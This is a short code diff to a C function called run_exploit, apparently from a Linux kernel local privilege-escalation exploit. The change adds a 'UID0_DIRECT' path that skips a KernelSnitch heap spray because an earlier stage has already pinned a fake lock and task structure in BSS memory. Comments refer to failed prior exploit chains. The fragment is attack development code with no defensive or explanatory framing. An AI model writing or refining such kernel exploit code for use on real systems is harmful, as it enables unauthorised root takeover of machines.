@@ -2934,7 +2934,13 @@ int run_exploit(int argc, char **argv) {
     pselect_child_node = 1;
     TIMER("  heap spray start");
     durable_stage("spray_start");
-    if (((env_flag("MODE4_SLIDE_ZERO", 0) &&
+    if (env_flag("UID0_DIRECT", 0)) {
+      /* P2 spray-free: uid0_w2_overlay already pinned lock/task to BSS —
+       * skip the KernelSnitch spray entirely (it starves on the churned
+       * post-P1 boot; chains F/G/H died here). */
+      pr_info("UID0_DIRECT: spray skipped (BSS overlay lock=%016zx)\n",
+              fake_lock);
+    } else if (((env_flag("MODE4_SLIDE_ZERO", 0) &&
           !env_flag("MODE4_SLIDE_CRED", 0)) ||
          (env_flag("MODE4_SLIDE", 0) && !env_flag("MODE4_SLIDE_SWAP", 0))) &&
         !env_flag("MODE4_SLIDE_CRED", 0) &&
